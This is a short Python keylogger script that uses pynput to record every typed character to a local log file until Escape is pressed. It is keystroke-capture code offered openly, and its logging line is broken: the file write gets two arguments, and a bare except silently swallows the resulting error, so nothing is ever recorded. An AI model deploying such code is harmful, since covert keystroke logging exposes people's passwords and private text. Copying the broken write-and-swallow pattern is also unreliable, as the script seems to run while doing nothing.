from pynput import keyboard

# File to store the logged keystrokes
log_file = "log.txt"

def write_to_file(key):
    """Writes the key pressed to the log file."""
    with open(log_file, "a") as file:
        try:
            # Write only characters
            if hasattr(key, 'char') and key.char is not None:
                file.write("\n",key.char)
        except Exception as e:
            pass

def on_press(key):
    """Callback function to handle key press events."""
    write_to_file(key)

def on_release(key):
    """Callback function to handle key release events."""
    if key == keyboard.Key.esc:
        # Stop listener on pressing the Escape key
        return False

# Set up and start the key listener
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
